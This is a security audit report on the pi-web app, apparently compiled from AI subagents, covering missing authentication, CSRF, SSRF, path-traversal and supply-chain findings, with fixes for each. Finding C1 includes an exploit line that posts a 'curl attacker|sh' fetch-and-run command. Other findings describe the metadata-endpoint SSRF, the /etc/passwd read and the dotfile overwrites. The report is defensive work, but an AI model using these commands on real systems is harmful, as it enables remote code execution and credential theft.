# pi-web Security Audit — Consolidated Report

**Date:** 2026-07-25
**Scope:** Full codebase (`app/`, `lib/`, `electron/`, `hooks/`, `components/`, `scripts/`, `bin/`)
**Method:** 10 parallel subagents auditing distinct domains (path traversal, command injection, auth/secrets, SSRF, SSE/streaming, session integrity, Electron, Next config, XSS, supply chain). Findings below are deduplicated and cross-referenced.

---

## Executive Summary

The single largest issue pervading the entire codebase is: **there is no `middleware.ts`, no authentication, no CSRF/Origin/Host validation, and (in the `next dev` / `next start` / `npx pi-web` launch paths) no forced loopback bind.** The Electron build correctly binds `127.0.0.1`, but the default Next listener binds `0.0.0.0`. Every `/api/*` route trusts every caller. Because the agent surface includes `bash`, file write, and arbitrary `npx` install, this collapses into multiple **Critical RCE chains** reachable from:
- Any process on the local machine,
- Any device on the LAN (when not loopback-bound),
- Any website the user visits (CSRF via `text/plain` "simple" POSTs that bypass CORS preflight, or DNS rebinding).

Everything below should be read with that root cause in mind. Fixing it (see **Root-Cause Fix #1**) neutralizes or downgrades the majority of findings.

### Severity counts
- **Critical:** 8
- **High:** 11
- **Medium:** 14
- **Low / Info:** 13

---

## CRITICAL FINDINGS

### C1 — No authentication / authorization on any API route; agent `bash` = RCE
**Files:** `lib/rpc-manager.ts` (no gate), `app/api/agent/[id]/route.ts:7-39`, `app/api/agent/new/route.ts:10-46`, `app/api/skills/install/route.ts:9`, `app/api/sessions/route.ts`, `app/api/files/[...path]/route.ts`.

`POST /api/agent/[id]` dispatches `{type:"bash", command}` straight to `executeBash` (arbitrary shell as the host user). Session ids are listed unauthenticated via `GET /api/sessions` and `GET /api/agent/running/events`. `POST /api/agent/new` accepts any `cwd` and any first prompt. `POST /api/skills/install` runs `npx skills add <pkg>` (see C2).
**Exploit:** `curl -X POST http://host:30141/api/agent/<id> -d '{"type":"bash","command":"curl attacker|sh"}'`
**Fix:** Auth layer + per-caller session ownership + command-type allowlist. Reject `bash`/`prompt`/`steer`/`fork` from unauthenticated callers.

### C2 — `/api/skills/install` → arbitrary npm package + lifecycle-script RCE
**File:** `app/api/skills/install/route.ts:9-24`, `lib/npx.ts`.
`pkg` taken verbatim from body, passed to `npx skills add <pkg> -y`. No name validation, no `--ignore-scripts`, no `cwd` allow-list check for project scope. `runNpx` uses `execFile` (no shell) so no metachar injection, but npm runs the package's `preinstall`/`postinstall` scripts → host RCE.
**Fix:** Validate `pkg` against `^@?[\w.-]+(/[\w.-]+)?(@[\w.^~+-]+)?$`; reject leading `-`; check `cwd` via `isFilePathAllowed`; require auth; drop `-y` or gate behind confirmation.

### C3 — CSRF → RCE on all POST routes (no Origin check, preflight bypass)
**Files:** no `middleware.ts`; `next.config.ts` (no CSRF/security headers); all POST routes.
`req.json()` parses regardless of `Content-Type`, so a cross-origin `fetch(url,{method:'POST',headers:{'Content-Type':'text/plain'},body:'...'})` is a CORS "simple request" — sent by the browser with no preflight, executes server-side even though the browser blocks reading the response. Combined with C1/C2 → a malicious website silently runs shell, installs packages, enables YOLO mode, overwrites `models.json`.
**Fix:** `middleware.ts` rejecting mutating requests whose `Origin`/`Sec-Fetch-Site` is absent or cross-site; require a custom header (e.g. `X-Requested-With`) that forces preflight; bind to loopback.

### C4 — `/api/cwd/validate` lets any caller register `/`, `~`, or any dir as a browsable root
**File:** `app/api/cwd/validate/route.ts:7-37`, `lib/allowed-roots.ts:25`, `lib/file-access.ts:59-69`.
`POST /api/cwd/validate {"cwd":"/"}` → `allowFileRoot("/")`. `isFilePathAllowed` then matches every absolute path (`rootWithSep = "/"`). Entire server-readable filesystem becomes browsable+readable via `/api/files`, `/api/file-index`, `/api/git/*`, `/api/worktrees`. Same widening via `app/api/agent/new/route.ts:35` (`allowFileRoot(cwd)` on attacker-chosen cwd).
**Fix:** Reject overly-broad roots (`/`, `~`, home, ancestors of system dirs); require the candidate to be nested inside an already-allowed root.

### C5 — Session-reference escape hatch reads arbitrary paths mentioned as strings in any session
**File:** `app/api/files/[...path]/route.ts:404-411`, `lib/session-file-references-core.ts:34-58`.
`isFilePathReferencedBySession` returns true when the requested absolute path appears as a *substring* in *any* entry of a session the caller names. Caller controls session content: `POST /api/agent/new {"message":"inspect /etc/passwd"}` then `GET /api/files/etc/passwd?type=read&sessionId=<S>` → reads `/etc/passwd`. Also matches `file://`-prefixed and URL-decoded forms. Bypasses the allow-list for read/download/meta/preview.
**Fix:** Restrict the escape hatch to paths that a *tool call* actually resolved (after `realpath`), and require the resolved path inside an allowed root. Do not consult user-authored message text.

### C6 — SSRF + stored API-key exfiltration via `/api/models-config/test`
**File:** `app/api/models-config/test/route.ts:21-90`.
Caller-controlled `provider.baseURL` (no scheme/host/IP validation) → server fetches arbitrary URL with the resolved stored API key for `providerName` attached (`Authorization: Bearer sk-...`). 300 chars of response body + status returned. Reaches cloud metadata `169.254.169.254` (returns IAM creds in <300 chars), internal hosts, or `https://attacker/` to capture keys. Uses default `AuthStorage` (`~/.pi/agent/auth.json`), so a colliding `providerName` (e.g. `openai`) leaks the real stored key.
**Fix:** Allowlist `http`/`https`; deny private/link-loopback/metadata IPs; re-resolve at fetch time (DNS-rebinding); never attach stored creds when `baseURL` differs from the configured endpoint; pass a throwaway `AuthStorage`; don't echo `responseText`.

### C7 — `/api/models-config` PUT overwrites `~/.pi/agent/models.json` with attacker JSON
**File:** `app/api/models-config/route.ts:30-41`.
No schema validation, no authz. Attacker points providers at their endpoint → every subsequent model call leaks prompts/keys. Also `GET /api/models-config` returns the file verbatim, leaking any inline `apiKey` (H1).
**Fix:** Validate body shape (allowlist keys, `https`-only `baseURL`, reject `__proto__`/`constructor`); redact `apiKey` on GET.

### C8 — `/api/files` POST = arbitrary file write (write-then-RCE) once a broad root exists
**File:** `app/api/files/[...path]/route.ts:118-203`.
After C4 (home/`/` added), upload to `~/.bashrc`/`~/.zshrc`/`~/.env`/`~/.ssh/authorized_keys`/`~/.pi/agent/models.json`. `validateUploadFileNames` blocks some names but not these. `flag:"wx"` prevents clobber only.
**Fix:** Restrict destinations to non-dotfile/non-config names inside pre-existing allowed roots; gate behind auth; block config locations.

---

## HIGH FINDINGS

### H1 — `GET /api/models-config` leaks plaintext API keys
`app/api/models-config/route.ts:30` returns `models.json` verbatim, including inline `provider.apiKey`. Redact before returning.

### H2 — Login callback token predictable / no expiry / hijackable
`app/api/auth/login/[provider]/route.ts:5-66`. Token = `${provider}-${Date.now()}-${Math.random()}` (non-crypto, low entropy). Stored in global `__piLoginCallbacks` with no TTL, only `startsWith(provider-)` checked on POST. Anyone who reads the SSE (M1) captures the token + device `userCode` → device-code race (authorize on attacker's account) or manual-code injection. **Fix:** `crypto.randomUUID()`; bind to SSE connection; TTL; size cap.

### H3 — Logout does not revoke server-side OAuth tokens
`app/api/auth/logout/[provider]/route.ts:9-13` only deletes the local credential. Exfiltrated tokens remain valid. Call the provider revoke endpoint.

### H4 — No rate limiting on auth / key / test endpoints
`/api/auth/api-key`, `/api/auth/login`, `/api/models-config/test`. Online credential-validation oracle + SSRF scan amplifier. Add per-IP/per-route token-bucket throttling.

### H5 — SSE streams: no Origin/Host validation; cross-origin/DNS-rebinding/LAN read of full transcripts
`app/api/agent/[id]/events/route.ts`, `app/api/agent/running/events/route.ts`, `app/api/auth/login/[provider]/route.ts`. No auth, no `Host` check. `EventSource` is credentialess but a DNS-rebind makes it same-origin → attacker page reads every assistant message, tool call, file path, bash output, and the login token (H2). The running-events SSE leaks the list of live session ids. **Fix:** Host allowlist + bearer token; force SSE off `EventSource` onto `fetch`+reader so a header is required.

### H6 — DELETE cascade-reparent rewrites sibling `.jsonl` non-atomically (TOCTOU + data loss)
`app/api/sessions/[id]/route.ts:215-226`. `readFileSync`→`writeFileSync` whole file with no lock; a concurrently-appending live `AgentSession` loses entries; crash mid-write corrupts the file. Propagates an unvalidated `parentSession` path into sibling headers (cross-file data write). **Fix:** Rewrite only the header line in place (or temp+rename); `flock`; skip live children; validate `parentSessionPath` is within the agent dir.

### H7 — Exported HTML served with no CSP (stored XSS if SDK under-escapes)
`app/api/sessions/[id]/export/route.ts` **[REMOVED — unused dead route]** (was L264-270). Session content (tool results, bash output, pasted HTML) embedded by the SDK with no route-side escaping and no CSP. The `?inline=1` variant renders in-browser; a single under-escaped field → JS in the localhost origin → full agent takeover (C1). **Fix:** `Content-Security-Policy: default-src 'none'` + `X-Content-Type-Options: nosniff` on the export response.

### H8 — No CSP / security headers on the app pages
`next.config.ts` sets only `Cache-Control` on `/`. App is frameable (clickjacking the agent "Confirm/Allow" prompts) and has no CSP. The DOCX preview route sets a strict CSP but the main app does not. **Fix:** global `Content-Security-Policy`, `X-Frame-Options: DENY` / `frame-ancestors 'none'`, `Referrer-Policy: no-referrer`, `X-Content-Type-Options: nosniff`, `Permissions-Policy`.

### H9 — `allowedDevOrigins: ['192.168.*.*']` widens cross-origin access in dev
`next.config.ts:21`. Entire `192.168.0.0/16` trusted as dev origin during `npm run dev`, and `next dev -p 30141` binds `0.0.0.0` by default → LAN hosts reach the unauthenticated API. **Fix:** drop the wildcard; bind `-H 127.0.0.1`.

### H10 — Auto-install of pi packages on every boot runs npm lifecycle scripts (supply-chain RCE)
`instrumentation.ts` → `lib/ensure-builtin-packages.ts` → pi `DefaultPackageManager.installNpm()`. Five third-party npm names (`@gotgenes/*`, `@juicesharp/*`, `@lll9p/*`) installed bare (unpinned) with no `--ignore-scripts`. A takeover/typosquat of any name → malicious `postinstall` runs as the user on every boot before interaction. **Fix:** pin exact versions; pass `--ignore-scripts`; checksum/allowlist; one-time consent.

### H11 — `GET /api/agent/[id]/events` silently starts a full AgentSession (DoS + write side effects)
`app/api/agent/[id]/events/route.ts:16-26`. A read-only GET spawns `startRpcSession` (loads file, binds extensions, registers in `globalThis`, starts idle timer). A beacon `<img src=.../events>` mass-starts sessions. **Fix:** events route must not start a session; 404 or stream history only; require explicit POST.

---

## MEDIUM FINDINGS

### M1 — Cross-origin SSE read amplifies all secrets-in-stream (see H5/H2)
### M2 — `POST /api/permissions` enables global YOLO mode unauthenticated
`app/api/permissions/route.ts:14-26` flips a global `yoloMode` flag affecting all sessions. Scope per-session; require auth.
### M3 — GET `/api/files` read/download/preview lacks `realpathSync` re-check (symlink escape)
`app/api/files/[...path]/route.ts:403-437`. POST upload does it (lines 95-110); GET does not. A symlink inside an allowed root → reads outside. Root cause: `isFilePathAllowed` (`lib/file-access.ts:54-69`) uses lexical `path.resolve` only. Affects `/api/files`, `/api/file-index`, `/api/git/*`, `/api/worktrees`. **Fix:** centralize a realpath-based canonicalization.
### M4 — `startRpcSession` `cwd` not allow-listed in `/api/agent/new` and skills install
`app/api/agent/new/route.ts:14-36` widens allow-list unconditionally. Skills install/update pass `cwd` straight to `runNpx` with no `checkCwdAllowed`.
### M5 — Argument injection: skill `ref` into `git fetch` (High per cmd-injection agent)
`lib/skill-updates.ts:75-86`. Unsanitized `install.ref` from a skill lock entry → `git fetch <repo> <ref>`; leading-`-` values interpreted as git options (`-c`, `--server-option`, etc.) when the GitHub API rate-limits (default state). Validate refname; insert `--`.
### M6 — Argument injection via `pkg`/`query` to `skills add`/`skills find`
`app/api/skills/install/route.ts:14`, `app/api/skills/search/route.ts:73`. Leading-dash values parsed as options. Reject leading `-`; insert `--`.
### M7 — Skills search proxy: env-controlled URL, no timeout/size/scheme check
`app/api/skills/search/route.ts:50-60`. `SKILLS_API_URL` honored without scheme validation; no `AbortController`; no max-byte cap; full JSON forwarded. Pin to `https://skills.sh`; add timeout + size cap.
### M8 — Unbounded SSE connections / listeners / intervals → DoS
`events/route.ts`, `running/events/route.ts`, `rpc-manager.ts:316`. No per-session/per-IP cap; `setInterval` per connection; `wrapper.listeners` unbounded. **Fix:** caps + 429; shared heartbeat; check `controller.desiredSize` for backpressure.
### M9 — 10-min idle timer destroys a live wrapper under a connected SSE (zombie stream / desync)
`lib/rpc-manager.ts:272-280`. `onEvent` does not reset the timer; idle-but-connected SSE becomes a corpse; new wrapper's events go elsewhere. Reset timer on listener attach / destroy with `listeners.length===0` gate; or close SSE streams on destroy.
### M10 — Stale-run guard incomplete: `agent_end`/`message_*` ignore the monotonic run id
`hooks/useAgentSession.ts:914-993`. Only `agentRunningRef` checked, not `promptRunIdRef`. A late buffered `agent_end` from run A tears down run B's streaming bubble. Thread run id through every handler.
### M11 — Mermaid SVG rendered via `dangerouslySetInnerHTML` (single-sanitizer dependency)
`components/MarkdownBody.tsx:194`. `mermaid.render` output (from model-controlled `\`\`\`mermaid` blocks) → `innerHTML`. Mitigated by `securityLevel:"strict"` (DOMPurify internally) but it is the only untrusted-text→innerHTML sink. **Fix:** explicit DOMPurify pass, or sandboxed iframe (no `allow-scripts`).
### M12 — `/api/skills` PATCH writes to an arbitrary existing file path
`app/api/skills/route.ts:32-58`. `filePath` never validated against allowed roots or a `SKILL.md` name. Turns a transient XSS into a persistent backdoor (corrupt `~/.zshrc`, `models.json`, SSH config). Validate with `isFilePathAllowed` + require `SKILL.md` under a skills path.
### M13 — `patchExportHtml` unvalidated string replacement on attacker-influenced HTML
`app/api/sessions/[id]/export/route.ts` **[REMOVED — unused dead route]** (was L108-206). Hardcoded anchors; a session message identical to an anchor → 500 (DoS) or wrong-location replace. Patch structurally or fix upstream.
### M14 — `export` route leaks full `process.env` (incl. model keys) into spawned `pi --export`
`app/api/sessions/[id]/export/route.ts` **[REMOVED — unused dead route]** (was L112). Pass a minimal env; set `cwd` to the session dir; bound concurrency.

---

## LOW / INFO FINDINGS

- **L1** No `Host` header validation → DNS-rebinding bypass of any Origin check you add. (middleware)
- **L2** Error responses leak internal details (`String(error)`, absolute paths, provider ids). Return generic messages.
- **L3** `/api/sessions/[id]/entries/[entryId]/thinking` exposes private reasoning from any branch (within-file auth gap). Scope to the active leaf.
- **L4** `auto-name` title stored unsanitized (prompt-injection); escape at render.
- **L5** `state` route leaks the full `systemPrompt`. Gate behind auth/`?include=`.
- **L6** Worktree branch name not validated against git ref rules before being passed to git (correctness/DoS, not RCE — `--` and `execFile` protect it).
- **L7** TOCTOU between `realpathSync` and `writeFileSync` in upload path. Re-resolve immediately before write.
- **L8** `shell.openExternal` called on every `window.open` URL with no scheme allowlist → `file:`/`smb:`/protocol handlers. Allow `http`/`https`/`mailto` only.
- **L9** IPC `pi-desktop:select-directory` skips `event.sender` check. Trivial to add.
- **L10** `npx pi-web` defaults to `0.0.0.0` (Next default when no `-H`). Default `bin/pi-web-options.js` hostname to `127.0.0.1`.
- **L11** Three core pi packages (`pi-ai`, `pi-agent-core`, `pi-tui`) have **no `integrity`** in `package-lock.json` → unverified fetch on `npm ci`. Regenerate lockfile.
- **L12** Two lockfiles committed (`package-lock.json` + `bun.lock`) → drift/poisoning. Pick one; add `.npmrc` (`ignore-scripts=true`, `registry=https://registry.npmjs.org/`).
- **L13** Electron build unsigned / `hardenedRuntime:false`. Sign + notarize if distributing; PDF preview iframe lacks `sandbox`/`nosniff`.

---

## Root-Cause Fixes (priority order)

### 1. Add `middleware.ts` — the single highest-leverage fix
- Reject any `/api/*` mutating method (`POST`/`PUT`/`PATCH`/`DELETE`) whose `Origin`/`Sec-Fetch-Site` is absent or cross-site.
- Validate `Host` header ∈ {`localhost`, `127.0.0.1`, `[::1]`, configured hostname} → stops DNS rebinding (L1).
- Require a custom header (e.g. `X-Requested-With: pi-web`) that forces CORS preflight → closes the `text/plain` simple-request CSRF (C3).
- Mint a random startup token at boot, require `Authorization: Bearer <token>` on every `/api/*` route (including SSE — forces SSE off `EventSource` onto `fetch`+reader, closing H5/M1/H2 simultaneously).
- Apply to SSE GETs too.

### 2. Bind all launch paths to `127.0.0.1`
- `bin/pi-web-options.js`: default `hostname` to `127.0.0.1`.
- `package.json` `dev`: `next dev -p 30141 -H 127.0.0.1`.
- Remove `allowedDevOrigins: ['192.168.*.*']` (H9).

### 3. Harden the file-access boundary
- `isFilePathAllowed`: centralize a `realpathSync`-based canonicalization (M3).
- `/api/cwd/validate` + `/api/agent/new`: reject overly-broad roots; require nesting inside an existing allowed root (C4, M4).
- Remove/strictly narrow the session-reference read escape hatch (C5).
- GET read/download/preview: re-check realpath (M3).
- Upload: block dotfile/config names (C8).

### 4. Lock down the model/skill surfaces
- `/api/models-config/test`: URL allowlist + isolated creds + no response echo (C6).
- `/api/models-config` PUT: schema validation; GET: redact keys (C7, H1).
- `/api/skills/install`: validate `pkg`; `--ignore-scripts`; allow-list `cwd` (C2, M6).
- `/api/skills` PATCH: `isFilePathAllowed` + `SKILL.md` name check (M12).
- Built-in package auto-install: pin versions + `--ignore-scripts` + consent (H10).

### 5. Command-type allowlist + session ownership
- `/api/agent/[id]` POST: reject `bash`/`prompt`/`steer`/`fork`/`navigate_tree` from unauthenticated callers; bind session ids to the caller (C1).

### 6. Headers / CSP
- Global `Content-Security-Policy`, `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy` (H8).
- CSP `default-src 'none'` on export responses (H7).
- Electron: `onHeadersReceived` CSP + `shell.openExternal` scheme allowlist + `will-navigate` (L8, H8).

### 7. SSE/streaming hardening (after #1, mostly defense-in-depth)
- Per-session/per-IP connection caps + 429 (M8).
- Backpressure on `controller.enqueue` (M8).
- Idle timer: reset on listener attach; destroy with `listeners.length===0` gate (M9).
- Thread run id through every SSE event handler (M10).
- Don't start a session on GET events (H11).

### 8. Auth-flow specifics
- `crypto.randomUUID()` login token; bind to SSE connection; TTL (H2).
- Revoke OAuth tokens on logout (H3).
- Rate-limit auth/key/test endpoints (H4).

### 9. Session integrity
- Atomic DELETE reparent (temp+rename) + lock + skip live children + validate `parentSession` (H6).
- Scope thinking route to active leaf (L3).

### 10. Supply chain / repo hygiene
- Regenerate `package-lock.json` with full `integrity` on default registry (L11).
- Delete `bun.lock`; add `.npmrc` (L12).
- Pin `react`/`react-dom`/`electron`/dev tooling to exact versions; enforce `npm ci` (H10).
- Sign/notarize Electron build (L13).

---

## Areas reviewed and found sound

- **Classic shell injection:** `lib/npx.ts`, `lib/worktree.ts`, git routes, `electron/main.js` all use `execFile`/`spawn` without `shell:true` and `--` separators. No metachar injection.
- **`bash-output` route:** strictly `tmpdir()` + `O_NOFOLLOW` + session-reference guard.
- **Fork path:** `entryId` validated; new id/file SDK-generated; "destroy immediately" trap correctly handled. No path traversal.
- **`navigate_tree`/`leafId`:** within-file branch selection; no cross-session read.
- **`PATCH /api/sessions/[id]`:** only `name`; JSON-encoded `session_info` append; no JSONL injection.
- **Markdown pipeline:** `rehypeRaw → rehypeSanitize → rehypeKatex`; default schema strips scripts/handlers and blocks `data:`/`javascript:` URLs. No `eval`/`new Function`/`innerHTML=` anywhere.
- **Electron `webPreferences`:** `contextIsolation:true`, `nodeIntegration:false`, `sandbox:true`, `webSecurity` default. Preload exposes only one benign `invoke`.
- **No committed secrets;** `.env*` gitignored; no lifecycle hooks at root.
- **ReDoS:** user-input regexes are linear/anchored.

---

*Prepared by 10 parallel audit subagents; consolidated and deduplicated.*
